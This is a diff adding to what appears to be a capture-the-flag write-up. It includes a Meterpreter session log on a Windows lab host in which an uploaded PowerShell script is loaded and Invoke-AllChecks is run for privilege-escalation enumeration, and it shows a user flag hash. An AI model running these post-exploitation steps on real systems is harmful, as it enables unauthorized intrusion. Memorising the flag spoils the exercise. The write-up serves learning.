@@ -203,3 +203,53 @@ more user.txt
 b04763b6fcf51fcd7c13abc7db4fd365
 
 ```
+
+```
+C:\Users\bill\Desktop>exit
+exit
+meterpreter > ls
+Listing: C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+====================================================================================
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+040777/rwxrwxrwx  0       dir   2026-07-11 00:28:41 -0400  %TEMP%
+100666/rw-rw-rw-  174     fil   2019-09-27 07:07:07 -0400  desktop.ini
+100777/rwxrwxrwx  760320  fil   2014-02-16 15:58:52 -0500  hfs.exe
+
+meterpreter > upload /home/kali/powershell
+[*] Uploading  : /home/kali/powershell -> powershell
+[*] Uploaded 586.50 KiB of 586.50 KiB (100.0%): /home/kali/powershell -> powershell
+[*] Completed  : /home/kali/powershell -> powershell
+meterpreter > ls
+Listing: C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+====================================================================================
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+040777/rwxrwxrwx  0       dir   2026-07-11 00:28:41 -0400  %TEMP%
+100666/rw-rw-rw-  174     fil   2019-09-27 07:07:07 -0400  desktop.ini
+100777/rwxrwxrwx  760320  fil   2014-02-16 15:58:52 -0500  hfs.exe
+100666/rw-rw-rw-  600580  fil   2026-07-11 00:46:10 -0400  powershell.psl
+
+meterpreter > load powershell
+Loading extension powershell...Success.
+meterpreter > powershell_shell
+PS > dir
+
+
+    Directory: C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+
+
+Mode                LastWriteTime     Length Name
+----                -------------     ------ ----
+d----         7/10/2026   9:55 PM            %TEMP%
+-a---         2/16/2014  12:58 PM     760320 hfs.exe
+-a---         7/10/2026   9:46 PM     600580 powershell.psl
+
+PS > . .\powershell.psl
+PS > Invoke-AllChecks
+
+
+
+```
